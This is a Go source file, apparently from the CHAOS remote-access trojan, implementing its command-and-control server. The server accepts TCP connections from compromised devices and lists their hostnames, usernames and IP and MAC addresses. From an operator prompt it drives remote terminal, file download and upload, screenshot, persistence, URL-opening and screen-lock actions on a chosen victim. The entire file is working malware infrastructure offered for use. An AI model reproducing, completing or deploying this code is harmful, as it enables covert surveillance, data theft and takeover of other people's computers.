package server

import (
	"encoding/json"
	"fmt"
	"github.com/c-bata/go-prompt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/handler"
	"github.com/tiagorlampert/CHAOS/internal/handler/client"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/usecase/download"
	"github.com/tiagorlampert/CHAOS/internal/usecase/information"
	"github.com/tiagorlampert/CHAOS/internal/usecase/lock_screen"
	"github.com/tiagorlampert/CHAOS/internal/usecase/open_url"
	"github.com/tiagorlampert/CHAOS/internal/usecase/persistence"
	"github.com/tiagorlampert/CHAOS/internal/usecase/screenshot"
	"github.com/tiagorlampert/CHAOS/internal/usecase/terminal"
	"github.com/tiagorlampert/CHAOS/internal/usecase/upload"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"github.com/tiagorlampert/CHAOS/internal/util/ui/completer"
	c "github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"net"
	"os"
	"strings"

	"github.com/jedib0t/go-pretty/table"
)

type ServerHandler struct {
	Listener net.Listener
	Devices  map[string]*models.Device
}

func NewServerHandler(address, port string) handler.Server {
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", address, port))
	if err != nil {
		log.WithField("cause", err.Error()).Fatal("error starting server")
	}

	return &ServerHandler{
		Listener: listener,
		Devices:  make(map[string]*models.Device),
	}
}

func (server *ServerHandler) HandleConnections() {
	fmt.Println(c.Cyan, fmt.Sprint("[*] Waiting for connection on ", server.Listener.Addr().String()))
	go server.AcceptConnections()

	p := prompt.New(
		server.executor,
		completer.ServerCompleter,
		prompt.OptionPrefix("server > "),
		prompt.OptionPrefixTextColor(prompt.White),
	)
	p.Run()
}

func (server *ServerHandler) AcceptConnections() {
	for {
		connection, err := server.Listener.Accept()
		if err != nil {
			log.WithField("cause", err.Error()).Error("error accepting connection")
			continue
		}

		message, _ := network.Read(connection)
		var device models.Device
		if err := json.Unmarshal(message.Data, &device); err != nil {
			log.WithField("cause", err.Error()).Error("error decoding device")
			return
		}

		device.Connection = connection
		server.SetDevice(device.MacAddress, &device)
	}
}

func (server *ServerHandler) SetDevice(key string, device *models.Device) {
	server.Devices[key] = device
}

func (server *ServerHandler) GetDevice(key string) (*models.Device, bool) {
	device, found := server.Devices[key]
	return device, found
}

func (server *ServerHandler) executor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch strings.TrimSpace(v) {
		case "devices":
			server.devices()
			return
		case "connect":
			server.connect(values)
			return
		case "exit":
			system.QuitApp()
		default:
			fmt.Println(c.White, fmt.Sprintf(`Command "%s" not found`, v))
			return
		}
	}
}

func (server *ServerHandler) devices() {
	countDevices := len(server.Devices)
	if countDevices == 0 {
		fmt.Println(c.Yellow, "[-] No devices connected!")
		return
	}

	renderDevicesTable(server.Devices)
}

func renderDevicesTable(devices map[string]*models.Device) {
	t := table.NewWriter()
	t.SetOutputMirror(os.Stdout)
	t.Style().Options.SeparateRows = true
	t.AppendHeader(table.Row{"#", "OS", "Hostname", "Username", "User ID", "Local IP", "Mac Address"})

	var count int
	for _, device := range devices {
		count++
		t.AppendRows([]table.Row{
			{count, device.OSName, device.Hostname, device.Username, device.UserID, device.LocalIPAddress, device.MacAddress},
		})
	}

	t.Render()
}

func (server *ServerHandler) connect(v []string) {
	if len(v) <= 1 {
		fmt.Println(c.Yellow, "[!] You should specify a target index!")
		return
	}

	device, err := getDeviceByIndex(server.Devices, v[1])
	if err != nil {
		log.WithField("cause", err.Error()).Errorf("error getting device with index %s", v[1])
		return
	}
	defer device.Connection.Close()

	// Use Case
	terminalUseCase := terminal.NewTerminalUseCase(device.Connection)
	informationUseCase := information.NewInformationUseCase(device.Connection)
	downloadUseCase := download.NewDownloadUseCase(device.Connection)
	uploadUseCase := upload.NewUploadUseCase(device.Connection)
	screenshotUseCase := screenshot.NewScreenshotUseCase(device.Connection)
	persistenceUseCase := persistence.NewPersistenceUseCase(device.Connection)
	openURLUseCase := open_url.NewOpenURLUseCase(device.Connection)
	lockScreenUseCase := lock_screen.NewLockScreenUseCase(device.Connection)

	useCase := usecase.UseCase{
		Terminal:    terminalUseCase,
		Information: informationUseCase,
		Download:    downloadUseCase,
		Upload:      uploadUseCase,
		Screenshot:  screenshotUseCase,
		Persistence: persistenceUseCase,
		OpenURL:     openURLUseCase,
		LockScreen:  lockScreenUseCase,
	}

	client.NewClientHandler(device.Connection, &useCase).HandleConnection(device.Hostname, device.UserID)
}

func getDeviceByIndex(devices map[string]*models.Device, vIndex string) (*models.Device, error) {
	v, err := util.StringToInt(vIndex)
	if err != nil {
		return nil, err
	}

	var index int
	for _, device := range devices {
		index++
		if index == v {
			return device, nil
		}
	}
	return nil, fmt.Errorf("index %d not found", v)
}
